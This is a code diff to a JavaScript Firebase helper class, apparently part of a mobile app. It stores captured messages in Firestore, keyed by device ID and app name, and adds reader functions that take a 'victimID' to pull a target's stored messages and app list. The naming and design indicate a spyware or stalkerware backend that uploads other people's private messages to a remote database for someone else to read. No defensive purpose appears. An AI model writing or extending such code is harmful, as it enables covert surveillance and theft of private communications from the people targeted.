@@ -32,25 +32,58 @@ export default class Firebase {
         });
     }
 
-    addMessageToCollection(msg){
-        this.addToCollection("messages",msg);
+    addMessageToCollection(msg,appName){
+        const userID = appSettings.getString("uniqueID");
+        this.addToCollection(`messages/${userID ? userID : 'flotting' }/${appName}`,msg);
+
+        this.setApplicationNamesToCollection(`settings/`,userID ? userID : 'flotting',appName);
     }
 
-    getAllCollections(collectionName){
+    getMessagesFromCollection(victimID,appName){
+        return this.getAllDocuments(`messages/${victimID}/${appName}`);
+    }
+
+    getApplicationNamesToCollection(victimID){
+        return this.getOneDocument(`settings/`,victimID);
+    }
+
+    getAllDocuments(collectionName){
         return new Promise((resolve,reject) => {
             firebase.firestore
             .collection(collectionName)
             .get()
             .then(querySnapshot => {
-                const snapshots = querySnapshot.map(doc => {
-                    return {
-                        id:doc.id,
-                        ...doc.data()
-                    }
-                })
+                let snapshots = null;
+                if(querySnapshot && querySnapshot.docs){
+                    snapshots = querySnapshot.docs.map(doc => {
+                        return {
+                            id:doc.id,
+                            ...doc.data()
+                        }
+                    })
+                }   
                return resolve(snapshots);
             }).catch(err => {
                 return reject(err);
+            });
+        })
+    }
+
+    getOneDocument(collectionName,docId){
+        return new Promise((resolve,reject) => {
+            firebase.firestore
+            .collection(collectionName)
+            .doc(docId)
+            .get()
+            .then(document => {
+                if(document && document.exists){
+                    return resolve(document.data());
+                }else{
+                    throw new Error("The document does not exist");
+                }
+            }).catch(err => {
+                console.log("Error",err)
+                return resolve(null);
             });
         })
     }
@@ -71,6 +104,38 @@ export default class Firebase {
             }).catch(err => {
                 console.log("Error",err);
                 return reject(err);
+            });
+        })
+    }
+
+
+    setApplicationNamesToCollection(collectionName,docId,appName){
+        return new Promise((resolve,reject) => {
+            firebase.firestore
+            .collection(collectionName)
+            .doc(docId)
+            .update({
+                "application-names": firebase.firestore.FieldValue.arrayUnion(appName)
+            })
+            .then(() => {
+               return true;
+            }).catch(err => {
+                return false;
+            }).then(answer => {
+                if(!answer){
+                    firebase.firestore
+                    .collection(collectionName)
+                    .doc(docId)
+                    .set({
+                        "application-names": [appName]
+                    }).then(() => {
+                        return resolve(true);
+                    }).catch(err =>{
+                        return reject(err);
+                    });
+                }else{
+                    return resolve(true);
+                }
             });
         })
     }
